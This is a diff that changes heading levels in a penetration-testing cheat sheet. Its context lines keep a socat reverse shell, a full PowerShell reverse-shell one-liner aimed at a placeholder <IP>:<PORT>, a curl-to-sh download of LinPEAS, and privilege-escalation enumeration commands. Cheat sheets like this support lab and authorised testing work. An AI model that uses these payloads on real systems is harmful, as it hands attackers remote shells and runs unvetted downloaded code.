@@ -54,7 +54,7 @@ gobuster vhost -u <URL> -w <WORDLIST>
 
 
 
-### REVERSE SHELLS
+## REVERSE SHELLS
 
  #### BASH
  
@@ -86,7 +86,7 @@ socat tcp-connect:<IP>:<PORT> exec:/bin/bash,pty,stderr,setsid,sigint,sane
 $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
- #### INTERACTIVE TTY
+ ### INTERACTIVE TTY
 
 ```bash
 script /dev/null -c bash
@@ -101,7 +101,7 @@ stty rows <ROWS> columns <COLUMNS>
 
 
 
-### SHARE AND DOWNLOAD
+## SHARE AND DOWNLOAD
 
 
  #### HTTP SERVER
@@ -156,7 +156,7 @@ wget "http://<IP>/"
 
 
 
-### SYSTEM ENUMERATION
+## SYSTEM ENUMERATION
 
 
  #### Enviroment Variables
@@ -191,7 +191,7 @@ getcap -r / 2>/dev/null
 ss -nltp
 ```
 
- ### Cron Jobs
+ #### Cron Jobs
  
 ```bash
 # Cron files
@@ -214,7 +214,7 @@ old_ps=$(ps -eo user,command); while true; do; new_ps=$(ps -eo user,command); di
 find / -user <USER> -perm -o+w \( -name \"*.sh\" -O -name \"*.py\" -O -name \"*.pl\" -O -name \"*.rb\" -O -name \"*.go\" -O -name \"*.lua\" \) 2>/dev/null
 ```
 
- ### LinPEAS
+ #### LinPEAS
  
 ```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
